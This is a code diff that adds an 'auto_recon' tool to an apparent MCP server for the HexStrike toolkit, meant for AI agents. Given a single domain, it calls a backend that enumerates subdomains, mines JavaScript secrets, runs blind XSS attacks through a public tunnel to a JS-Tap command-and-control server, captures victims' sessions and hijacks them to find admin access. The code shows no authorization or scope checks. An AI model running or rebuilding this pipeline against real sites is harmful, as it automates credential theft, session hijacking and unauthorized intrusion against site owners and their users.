@@ -7010,6 +7010,192 @@ def setup_mcp_server(hexstrike_client: HexStrikeClient) -> FastMCP:
         )
         return {"output": "\n".join(lines), "data": result}
 
+    # ─────────────────────────────────────────────────────────
+    #  AUTO-RECON PIPELINE TOOL  🚀
+    # ─────────────────────────────────────────────────────────
+    @mcp.tool()
+    def auto_recon(
+        domain: str,
+        use_subfinder: bool = True,
+        use_amass: bool = False,
+        js_secret_depth: int = 2,
+        run_xss_pipeline: bool = True,
+        tunnel_provider: str = "auto",
+        tunnel_auth_token: str = "",
+        jstap_port: int = 8444,
+        jstap_username: str = "",
+        jstap_password: str = "",
+        max_hosts_xss: int = 5,
+        run_session_hijack: bool = True,
+        dry_run: bool = False,
+        max_workers: int = 5,
+    ) -> Dict[str, Any]:
+        """
+        Full automated recon-to-exploitation pipeline.
+        Provide a domain name and get back secrets, XSS findings,
+        captured sessions, and verified account access — all in one call.
+
+        Pipeline stages:
+          [1] Host Discovery  — subfinder / amass → httpx
+                                Enumerates subdomains, probes liveness
+          [2] Recon (parallel)— CSP analysis on every live host
+                                JS secret mining on every live host
+                                (runs both simultaneously with threading)
+          [3] Prioritization  — Ranks hosts by: injectable CSP + secret count
+                                Caps XSS targets at max_hosts_xss
+          [4] XSS Campaign    — Shared tunnel + JS-Tap C2 started once
+                                katana → kxss → dalfox --blind=telemlib_url
+                                on each prioritized host
+          [5] Post-Exploitation — Polls JS-Tap for captured sessions
+                                  loot_analyze per session (cookies, XHR, forms)
+                                  session_hijack to verify + find admin access
+
+        Args:
+            domain:            Target domain (e.g. example.com — no https://)
+            use_subfinder:     Run subfinder for subdomain enum (default True)
+            use_amass:         Run amass passive enum as well (default False, slower)
+            js_secret_depth:   katana crawl depth for JS secret mining (default 2)
+            run_xss_pipeline:  Run dalfox XSS campaign (default True)
+            tunnel_provider:   Tunnel for C2 delivery: auto/ngrok/cloudflared/serveo
+            tunnel_auth_token: Auth token for ngrok/cloudflared if required
+            jstap_port:        JS-Tap server port (default 8444)
+            jstap_username:    JS-Tap portal username
+            jstap_password:    JS-Tap portal password
+            max_hosts_xss:     Max hosts to run XSS campaign against (default 5)
+            run_session_hijack:Run session replay after XSS capture (default True)
+            dry_run:           Recon only — skip XSS + post-exploitation (default False)
+            max_workers:       Parallel workers for stage 2 (default 5)
+
+        Returns:
+            Per-stage results plus a top-level summary with counts for
+            live hosts, injectable hosts, secrets found, XSS findings,
+            sessions captured, sessions hijacked, and admin sessions.
+        """
+        resp = requests.post(
+            f"{BASE_URL}/api/tools/pipeline/autorecon",
+            json={
+                "domain":             domain,
+                "use_subfinder":      use_subfinder,
+                "use_amass":          use_amass,
+                "js_secret_depth":    js_secret_depth,
+                "run_xss_pipeline":   run_xss_pipeline,
+                "tunnel_provider":    tunnel_provider,
+                "tunnel_auth_token":  tunnel_auth_token,
+                "jstap_port":         jstap_port,
+                "jstap_username":     jstap_username,
+                "jstap_password":     jstap_password,
+                "max_hosts_xss":      max_hosts_xss,
+                "run_session_hijack": run_session_hijack,
+                "dry_run":            dry_run,
+                "max_workers":        max_workers,
+            },
+            timeout=3600,  # Long-running — up to 1 hour
+        )
+        result = resp.json()
+        summary = result.get("summary", {})
+        stages  = result.get("stages", {})
+
+        # ── Header ────────────────────────────────────────────────────────────
+        lines = [
+            f"{'='*60}",
+            f"  🚀 AUTO-RECON PIPELINE — {domain}",
+            f"  ⏱  Duration: {result.get('duration_sec', 0)}s",
+            f"{'='*60}",
+            "",
+            "📊 SUMMARY",
+            f"  🌐 Live hosts        : {summary.get('live_hosts', 0)}",
+            f"  💉 Injectable hosts  : {summary.get('injectable_hosts', 0)}",
+            f"  🔑 JS secrets found  : {summary.get('js_secret_findings', 0)}",
+            f"  🎯 XSS hosts scanned : {summary.get('xss_hosts_scanned', 0)}",
+            f"  🪝 XSS findings      : {summary.get('xss_findings', 0)}",
+            f"  👥 Sessions captured : {summary.get('sessions_captured', 0)}",
+            f"  🍪 Sessions hijacked : {summary.get('sessions_hijacked', 0)}",
+            f"  👑 Admin sessions    : {summary.get('admin_sessions', 0)}",
+            "",
+        ]
+
+        # ── Stage 1: Discovery ────────────────────────────────────────────────
+        disc = stages.get("discovery", {})
+        lines.append(f"[1/5] HOST DISCOVERY  ({disc.get('count', 0)} live hosts)")
+        for h in disc.get("live_hosts", [])[:15]:
+            lines.append(f"   {h}")
+        if len(disc.get("live_hosts", [])) > 15:
+            lines.append(f"   … and {len(disc['live_hosts'])-15} more")
+        lines.append("")
+
+        # ── Stage 2: CSP + Secrets ────────────────────────────────────────────
+        csp_s = stages.get("csp", {})
+        sec_s = stages.get("js_secrets", {})
+        lines.append(f"[2/5] RECON  (parallel)")
+        lines.append(f"   CSP — {csp_s.get('injectable_count', 0)}/{csp_s.get('hosts_analyzed', 0)} injectable")
+        if csp_s.get("injectable_hosts"):
+            for h in csp_s["injectable_hosts"]:
+                csp_r = csp_s.get("results", {}).get(h, {})
+                lines.append(f"     ✅ {h}  (CRITICAL:{csp_r.get('critical',0)} HIGH:{csp_r.get('high',0)})")
+        lines.append(f"   Secrets — {sec_s.get('total_findings', 0)} findings  "
+                     f"(CRITICAL:{sec_s.get('critical',0)} HIGH:{sec_s.get('high',0)})")
+        for url, findings in sec_s.get("findings_by_host", {}).items():
+            if findings:
+                lines.append(f"     🔑 {url}  ({len(findings)} secrets)")
+                for f in findings[:3]:
+                    lines.append(f"       [{f['severity']}] {f['type']} — {f.get('match','')[:60]}")
+                if len(findings) > 3:
+                    lines.append(f"       … and {len(findings)-3} more")
+        lines.append("")
+
+        # ── Stage 3: Prioritization ───────────────────────────────────────────
+        pri = stages.get("prioritization", {})
+        lines.append(f"[3/5] PRIORITIZED TARGETS  (top {len(pri.get('hosts_prioritized',[]))})")
+        for i, h in enumerate(pri.get("hosts_prioritized", []), 1):
+            lines.append(f"   #{i}  {h}")
+        lines.append("")
+
+        # ── Stage 4: XSS Campaign ─────────────────────────────────────────────
+        xss_s = stages.get("xss", {})
+        if xss_s.get("dry_run"):
+            lines.append(f"[4/5] XSS CAMPAIGN  (dry run — would scan {len(xss_s.get('would_scan',[]))} hosts)")
+        elif xss_s.get("skipped"):
+            lines.append(f"[4/5] XSS CAMPAIGN  (skipped)")
+        else:
+            lines.append(f"[4/5] XSS CAMPAIGN  (tunnel: {xss_s.get('tunnel_url','N/A')})")
+            for url, xr in xss_s.get("results", {}).items():
+                if url.startswith("_"):
+                    continue
+                dalfox = xr.get("dalfox_findings", []) if isinstance(xr, dict) else []
+                lines.append(f"   {url}  — {len(dalfox)} XSS findings")
+                for finding in dalfox[:3]:
+                    lines.append(f"     🎯 [{finding.get('method','?')}] param:{finding.get('param','?')} → {finding.get('target_url','')[:80]}")
+                if len(dalfox) > 3:
+                    lines.append(f"     … and {len(dalfox)-3} more")
+        lines.append("")
+
+        # ── Stage 5: Post-Exploitation ────────────────────────────────────────
+        post = stages.get("post_exploitation", {})
+        if post.get("skipped"):
+            lines.append("[5/5] POST-EXPLOITATION  (skipped)")
+        else:
+            lines.append(f"[5/5] POST-EXPLOITATION")
+            lines.append(f"   Sessions captured : {post.get('sessions_captured', 0)}")
+            lines.append(f"   Loot findings     : {post.get('total_loot_findings', 0)}")
+            lines.append(f"   Sessions hijacked : {post.get('sessions_hijacked', 0)}")
+            for hs in result.get("hijacked_sessions", []):
+                admin_tag = " 👑 ADMIN" if hs.get("is_admin") else ""
+                lines.append(f"   🍪 {hs.get('target')}  user={hs.get('username','?')}{admin_tag}")
+                for ep in hs.get("auth_eps", [])[:3]:
+                    lines.append(f"      ✅ {ep}")
+                for ep in hs.get("admin_eps", [])[:3]:
+                    lines.append(f"      👑 {ep}")
+        lines.append("")
+        lines.append("=" * 60)
+
+        logger.info(
+            f"{HexStrikeColors.SUCCESS}🚀 AutoRecon complete: {domain} — "
+            f"{summary.get('live_hosts',0)} hosts | "
+            f"{summary.get('js_secret_findings',0)} secrets | "
+            f"{summary.get('sessions_hijacked',0)} hijacked{HexStrikeColors.RESET}"
+        )
+        return {"output": "\n".join(lines), "data": result}
+
     return mcp
 
 def parse_args():
